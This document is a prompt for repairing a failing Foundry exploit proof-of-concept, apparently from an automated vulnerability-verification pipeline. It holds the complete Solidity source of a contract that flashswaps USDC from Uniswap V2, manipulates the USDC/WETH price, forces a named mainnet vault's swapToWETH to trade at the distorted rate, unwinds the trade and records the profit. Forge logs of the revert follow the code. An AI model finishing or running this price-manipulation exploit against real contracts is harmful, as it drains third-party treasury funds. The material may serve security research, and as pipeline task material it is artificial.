You are fixing a failing Foundry PoC for finding F-002.

Goal:
- Keep the exploit objective for this finding.
- Fix compile/runtime/test failure from logs.
- Return COMPLETE updated Solidity for `src/FlawVerifier.sol` only.
- Keep exploit logic aligned with the full `Exploit paths` list unless logs prove a stage is infeasible.
- Additional realistic public on-chain economic steps are allowed when required for execution (including flashloans/swaps/mint/burn), but keep the same exploit causality and justify in comments.

Hard constraints:
- Do NOT use external answers/PoCs/articles/repos (including DeFiHackLabs).
- Do NOT cheat: no vm.deal, vm.store, vm.etch, vm.mockCall, vm.prank, vm.startPrank, arbitrary balance injection, or arbitrary storage writes.
- Allowed: flashloans and realistic public on-chain actions.
- Work only from finding context (claim/paths/locations) + on-chain state context already provided in this workspace.
- Hard anti-cheat: profitToken MUST NOT be a token deployed during this PoC/test. Profit token must already exist on-chain at the fork block.
- Hard anti-cheat: do not deploy custom ERC20/token contracts to manufacture profit accounting.

Attempt strategy (must follow for this attempt):
- strategy_label: v2_flashswap_funding
- strategy_instructions: Prefer UniswapV2/Sushi-like flashswap funding with deterministic repayment and minimal route complexity.
- Keep exploit root cause and `Exploit paths` unchanged; only vary funding/execution implementation details.

Finding:
- title: Target vault's `swapToWETH` can be sandwiched at a manipulated price, draining vault value
- claim: The exploit flow first executes a large price-moving swap, then calls `swapToWETH` on the target vault at `VAULT_ADDR`, and finally unwinds the market move. Together with the in-file note referencing a slippage exploit, this strongly suggests the target vault's `swapToWETH` relies on manipulable live pool pricing and/or lacks an effective minimum-output check. A caller can therefore force the vault to trade at an attacker-controlled rate.
- impact: An attacker can temporarily distort the USDC/WETH market, trigger the vault's swap while the distorted price is live, and then unwind the manipulation to keep the spread. The vault realizes the bad execution as a direct loss of treasury assets.
- exploit_paths: ["Source enough capital to move the relevant USDC/WETH pool price.", "Execute a large swap that skews the price seen by the vault.", "Call the target vault's `swapToWETH` while the manipulated price is active.", "Reverse the initial trade and keep the profit created by the vault's slippage loss."]

Current FlawVerifier.sol:
```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

interface IERC20Like {
    function balanceOf(address account) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transfer(address to, uint256 amount) external returns (bool);
}

interface IWETHLike is IERC20Like {
    function deposit() external payable;
}

interface IDexRouterLike {
    function uniswapV3SwapTo(
        uint256 receiver,
        uint256 amount,
        uint256 minReturn,
        uint256[] calldata pools
    ) external payable returns (uint256 returnAmount);
}

interface IDRLVaultLike {
    function swapToWETH(uint256 amount) external returns (uint256 amountOut);
}

interface IUniV3LikePool {
    function swap(
        address recipient,
        bool zeroForOne,
        int256 amountSpecified,
        uint160 sqrtPriceLimitX96,
        bytes calldata data
    ) external returns (int256 amount0, int256 amount1);
}

interface IUniswapV2PairLike {
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
}

contract FlawVerifier {
    address internal constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    address internal constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address internal constant POOL = 0xE0554a476A092703abdB3Ef35c80e0D76d32939F;
    address internal constant DEX_ROUTER = 0x2E1Dee213BA8d7af0934C49a23187BabEACa8764;
    address internal constant TOKEN_APPROVE = 0x40aA958dd87FC8305b97f2BA922CDdCa374bcD7f;
    address internal constant VAULT = 0x6A06707ab339BEE00C6663db17DdB422301ff5e8;

    // Canonical Uniswap V2 USDC/WETH pair on mainnet. Borrowing USDC here keeps the
    // exploit path unchanged while replacing the funding leg with a deterministic V2
    // flashswap, per the requested attempt strategy.
    address internal constant FLASHSWAP_PAIR = 0xB4e16d0168e52d35CaCD2c6185b44281Ec28C9Dc;

    uint256 internal constant FLASHSWAP_USDC = 13_980_773_000_000;
    uint256 internal constant VAULT_SWAP_USDC = 100_000_000_000;
    uint256 internal constant FIRST_POOL_HINT =
        14474011154664524427946373127366704448275315930774981940324572871603728323487;
    uint256 internal constant SECOND_POOL_HINT =
        57896044618658097711785492505624669893251560180390193455121166874571151938463;
    uint256 internal constant FIRST_MIN_RETURN = 96069676420420156;
    uint256 internal constant REVERSE_ETH_IN = 779999999999792152553;
    uint160 internal constant FINAL_SQRT_PRICE_LIMIT_X96 =
        1461446703485210103287273052203988822378723970341;

    address internal _profitToken;
    uint256 internal _profitAmount;
    bool internal _executed;

    constructor() {
        _profitToken = WETH;
    }

    function executeOnOpportunity() external {
        require(!_executed, "already executed");
        _executed = true;

        uint256 startUsdc = IERC20Like(USDC).balanceOf(address(this));
        uint256 startWeth = IERC20Like(WETH).balanceOf(address(this));
        uint256 startEth = address(this).balance;

        _ensureApprovals();

        if (startUsdc >= FLASHSWAP_USDC) {
            _executePath(0);
        } else {
            // Stage 1: source enough capital to move the relevant USDC/WETH market.
            // This is a realistic public on-chain funding step: borrow USDC from the
            // deep Uniswap V2 pair and repay it atomically after the manipulated vault
            // swap is unwound. The remaining steps preserve the same exploit causality.
            IUniswapV2PairLike(FLASHSWAP_PAIR).swap(FLASHSWAP_USDC, 0, address(this), abi.encode(uint256(1)));
        }

        _snapshotProfit(startUsdc, startWeth, startEth);
    }

    function uniswapV2Call(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external {
        require(msg.sender == FLASHSWAP_PAIR, "only pair");
        require(sender == address(this), "bad sender");
        require(amount0 == FLASHSWAP_USDC && amount1 == 0, "bad amounts");
        require(data.length != 0, "bad data");

        uint256 repayment = _flashswapRepayment(amount0);
        _executePath(repayment);
        _safeTransfer(USDC, FLASHSWAP_PAIR, repayment);
    }

    function _executePath(uint256 targetUsdcBalance) internal {
        uint256 receiver = uint256(uint160(address(this)));
        uint256[] memory pools = new uint256[](1);

        // Stage 2: execute the large price-moving swap that distorts the live pool.
        pools[0] = FIRST_POOL_HINT;
        IDexRouterLike(DEX_ROUTER).uniswapV3SwapTo(receiver, FLASHSWAP_USDC, FIRST_MIN_RETURN, pools);

        // Stage 3: trigger the vault while the manipulated price is still live.
        IDRLVaultLike(VAULT).swapToWETH(VAULT_SWAP_USDC);

        // Stage 4a: reverse the router leg of the manipulation.
        pools[0] = SECOND_POOL_HINT;
        IDexRouterLike(DEX_ROUTER).uniswapV3SwapTo{value: REVERSE_ETH_IN}(receiver, REVERSE_ETH_IN, 0, pools);

        uint256 ethBalance = address(this).balance;
        if (ethBalance != 0) {
            IWETHLike(WETH).deposit{value: ethBalance}();
        }

        // Stage 4b: if the flashswap funding leg is active, convert only the exact
        // additional WETH needed into USDC to cover deterministic V2 repayment. Any
        // residual WETH remains as realized profit from the vault's slippage loss.
        if (targetUsdcBalance != 0) {
            uint256 currentUsdc = IERC20Like(USDC).balanceOf(address(this));
            if (currentUsdc < targetUsdcBalance) {
                uint256 shortfall = targetUsdcBalance - currentUsdc;
                require(shortfall <= uint256(type(int256).max), "shortfall too large");
                IUniV3LikePool(POOL).swap(
                    address(this),
                    false,
                    -_toInt256(shortfall),
                    FINAL_SQRT_PRICE_LIMIT_X96,
                    hex""
                );
            }
        }
    }

    function _flashswapRepayment(uint256 borrowed) internal pure returns (uint256) {
        return ((borrowed * 1000) / 997) + 1;
    }

    function _ensureApprovals() internal {
        IERC20Like(USDC).approve(TOKEN_APPROVE, type(uint256).max);
    }

    function _safeTransfer(address token, address to, uint256 amount) internal {
        require(IERC20Like(token).transfer(to, amount), "transfer failed");
    }

    function _toInt256(uint256 value) internal pure returns (int256) {
        require(value <= uint256(type(int256).max), "int overflow");
        return int256(value);
    }

    function _positiveToUint256(int256 value) internal pure returns (uint256) {
        require(value >= 0, "negative value");
        return uint256(value);
    }

    function _snapshotProfit(uint256 startUsdc, uint256 startWeth, uint256 startEth) internal {
        uint256 endUsdc = IERC20Like(USDC).balanceOf(address(this));
        uint256 endWeth = IERC20Like(WETH).balanceOf(address(this));
        uint256 endEth = address(this).balance;

        uint256 usdcDelta = endUsdc > startUsdc ? endUsdc - startUsdc : 0;
        uint256 wethDelta = endWeth > startWeth ? endWeth - startWeth : 0;
        uint256 ethDelta = endEth > startEth ? endEth - startEth : 0;

        _profitToken = WETH;
        _profitAmount = wethDelta;

        if (_profitAmount == 0 && usdcDelta != 0) {
            _profitToken = USDC;
            _profitAmount = usdcDelta;
        }

        if (_profitAmount == 0 && ethDelta != 0) {
            _profitToken = address(0);
            _profitAmount = ethDelta;
        }
    }

    function uniswapV3SwapCallback(int256, int256 amount1Delta, bytes calldata) external {
        _payPool(amount1Delta);
    }

    function pancakeV3SwapCallback(int256, int256 amount1Delta, bytes calldata) external {
        _payPool(amount1Delta);
    }

    function _payPool(int256 amount1Delta) internal {
        require(msg.sender == POOL, "only pool");
        if (amount1Delta > 0) {
            _safeTransfer(WETH, POOL, _positiveToUint256(amount1Delta));
        }
    }

    function profitToken() external view returns (address) {
        return _profitToken;
    }

    function profitAmount() external view returns (uint256) {
        return _profitAmount;
    }

    receive() external payable {}
}

```

forge stdout (tail):
```
Compiling 2 files with Solc 0.8.30
Solc 0.8.30 finished in 1.47s
Compiler run successful with warnings:
Warning (2072): Unused local variable.
  --> test/ExploitPOC.t.sol:68:19:
   |
68 |         (bool ok, bytes memory ret) = address(verifier).call(abi.encodeWithSignature("executeOnOpportunity()"));
   |                   ^^^^^^^^^^^^^^^^


Ran 1 test for test/ExploitPOC.t.sol:FlawVerifierTest
[FAIL: exploit call reverted] testExploit() (gas: 89572)
Traces:
  [89572] FlawVerifierTest::testExploit()
    ├─ [2346] FlawVerifier::profitToken() [staticcall]
    │   └─ ← [Return] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2
    ├─ [2534] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   └─ ← [Return] 0
    ├─ [74941] FlawVerifier::executeOnOpportunity()
    │   ├─ [9839] 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   ├─ [2553] 0x43506849D7C04F9138D1A2050bbF3A0c054402dd::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [delegatecall]
    │   │   │   └─ ← [Return] 0
    │   │   └─ ← [Return] 0
    │   ├─ [534] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [27462] 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48::approve(0x40aA958dd87FC8305b97f2BA922CDdCa374bcD7f, 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
    │   │   ├─ [26673] 0x43506849D7C04F9138D1A2050bbF3A0c054402dd::approve(0x40aA958dd87FC8305b97f2BA922CDdCa374bcD7f, 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77]) [delegatecall]
    │   │   │   ├─  emit topic 0: 0x8c5be1e5ebec7d5bd14f71427d1e84f3dd0314c0f7b2291e5b200ac8c7c3b925
    │   │   │   │        topic 1: 0x0000000000000000000000005615deb798bb3e4dfa0139dfa1b3d433cc23b72f
    │   │   │   │        topic 2: 0x00000000000000000000000040aa958dd87fc8305b97f2ba922cddca374bcd7f
    │   │   │   │           data: 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
    │   │   │   └─ ← [Return] true
    │   │   └─ ← [Return] true
    │   ├─ [7899] 0xB4e16d0168e52d35CaCD2c6185b44281Ec28C9Dc::swap(13980773000000 [1.398e13], 0, FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 0x0000000000000000000000000000000000000000000000000000000000000001)
    │   │   └─ ← [Revert] UniswapV2: INSUFFICIENT_LIQUIDITY
    │   └─ ← [Revert] UniswapV2: INSUFFICIENT_LIQUIDITY
    └─ ← [Revert] exploit call reverted

Backtrace:
  at 0xB4e16d0168e52d35CaCD2c6185b44281Ec28C9Dc.swap
  at FlawVerifier.executeOnOpportunity
  at FlawVerifierTest.testExploit

Suite result: FAILED. 0 passed; 1 failed; 0 skipped; finished in 547.39ms (523.06ms CPU time)

Ran 1 test suite in 572.63ms (547.39ms CPU time): 0 tests passed, 1 failed, 0 skipped (1 total tests)

Failing tests:
Encountered 1 failing test in test/ExploitPOC.t.sol:FlawVerifierTest
[FAIL: exploit call reverted] testExploit() (gas: 89572)

Encountered a total of 1 failing tests, 0 tests succeeded

Tip: Run `forge test --rerun` to retry only the 1 failed test

```

forge stderr (tail):
```

```

Requirements:
1. pragma ^0.8.20
2. include at least one deployable contract with zero-arg constructor
3. define fixed entry `executeOnOpportunity()` as no-arg external/public exploit function
4. no imports
5. keep exploit logic aligned to exploit_paths (same core actions and ordering intent)
6. expose `profitToken()` and `profitAmount()` getters for net realized profit
7. additional realistic public on-chain economic steps are allowed when required for execution, but keep exploit_paths core causality and justify in comments
8. output ONLY Solidity code
